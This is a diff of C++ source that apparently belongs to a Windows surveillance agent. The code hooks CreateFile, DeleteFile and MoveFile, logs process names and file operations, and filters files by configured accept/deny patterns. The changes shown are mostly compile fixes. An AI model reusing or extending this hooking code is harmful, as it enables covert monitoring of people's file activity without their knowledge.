@@ -1,3 +1,18 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <json/JSON.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/process.h"
+#include "../../H4DLL/LOG.h"
+#include "../../H4DLL/bin_string.h"
+
 #include <shlwapi.h>
 
 #define MAXFILELEN (_MAX_PATH * 2 + 2) // Lunghezza per un nome widechar
@@ -35,7 +50,7 @@ extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 
 // -- Wrapper CreateFileA e CreateFileW
-static HANDLE _stdcall PM_CreateFile(DWORD ARG1,
+HANDLE _stdcall PM_CreateFile(DWORD ARG1,
 									  DWORD ARG2,
 									  DWORD ARG3,
 									  DWORD ARG4,
@@ -87,7 +102,7 @@ static HANDLE _stdcall PM_CreateFile(DWORD ARG1,
 }
 
 
-static DWORD PM_CreateFile_setup(HMServiceStruct * pData)
+DWORD PM_CreateFile_setup(HMServiceStruct * pData)
 {
 	HMODULE hMod;
 
@@ -110,7 +125,7 @@ static DWORD PM_CreateFile_setup(HMServiceStruct * pData)
 
 	if (proc_name) {
 		proc_name++;
-		if (!stricmp(proc_name, "rundll32.exe"))
+		if (!_stricmp(proc_name, "rundll32.exe"))
 			return 1;
 	} 
 
@@ -118,11 +133,11 @@ static DWORD PM_CreateFile_setup(HMServiceStruct * pData)
 }
 
 // -- Wrapper DeleteFileA e DeleteFileW
-static BOOL _stdcall PM_DeleteFile(DWORD ARG1)
+BOOL _stdcall PM_DeleteFile(DWORD ARG1)
 {
 	IPCCreateFileStruct IPCFileData;
 	char *pTmp;
-	DWORD i,j;
+	DWORD i;
 	BOOL *Active;
 
 	MARK_HOOK
@@ -165,7 +180,7 @@ static BOOL _stdcall PM_DeleteFile(DWORD ARG1)
 }
 
 // -- Wrapper MoveFileA e MoveFileW
-static BOOL _stdcall PM_MoveFile(DWORD ARG1, DWORD ARG2)
+BOOL _stdcall PM_MoveFile(DWORD ARG1, DWORD ARG2)
 {
 	IPCCreateFileStruct IPCFileData;
 	char *pTmp;
@@ -292,9 +307,9 @@ void PopulatePatternList(JSONObject conf_list)
 
 	// ...e parsa tutte le stirnghe unicode
 	for (i=0; i<pattern_list.accept_count; i++) 
-		pattern_list.accept_list[i] = wcsdup(accept[i]->AsString().c_str());
+		pattern_list.accept_list[i] = _wcsdup(accept[i]->AsString().c_str());
 	for (i=0; i<pattern_list.deny_count; i++) 
-		pattern_list.deny_list[i] = wcsdup(deny[i]->AsString().c_str());
+		pattern_list.deny_list[i] = _wcsdup(deny[i]->AsString().c_str());
 }
 
 // Compara due stringhe con wildcard
@@ -454,7 +469,7 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 				tolog.add(proc_name, strlen(proc_name)+1);
 				SAFE_FREE(proc_name);
 			} else
-				tolog.add("UNKNOWN", strlen("UNKNOWN")+1);
+				tolog.add("UNKNOWN");
 			tolog.add(&hi_dim, sizeof(hi_dim));
 			tolog.add(&lo_dim, sizeof(lo_dim));
 			tolog.add(&ops, sizeof(ops));
